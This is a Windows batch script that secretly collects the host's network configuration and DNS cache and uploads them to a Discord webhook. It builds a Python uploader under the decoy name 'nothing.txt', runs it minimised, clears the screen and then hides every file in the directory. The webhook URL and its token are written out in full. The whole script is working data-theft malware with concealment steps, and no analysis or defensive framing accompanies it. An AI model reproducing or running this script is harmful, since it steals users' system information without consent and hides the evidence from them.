@echo off
ipconfig /all > "%cd%\data.txt" && ipconfig /displaydns > "%cd%\data2.txt"
pip install requests >nul
echo import requests > nothing.txt
echo myurl = 'https://discord.com/api/webhooks/1057648629134938182/hzlxXj6EVPubzjBEjphm0ZBvQg-8JAtEvm7hjW1TAk1kMvpVNwZCd8nx4WBAWNojGsE8' >> nothing.txt
echo f = {'file data': open('data.txt', 'rb')} >> nothing.txt
echo res = requests.post(myurl, files=f) >> nothing.txt
echo g = {'file data': open('data2.txt', 'rb')} >> nothing.txt
echo res = requests.post(myurl, files=g) >> nothing.txt
ren nothing.txt nothing.py
start /min nothing.py
cls
attrib *.* +h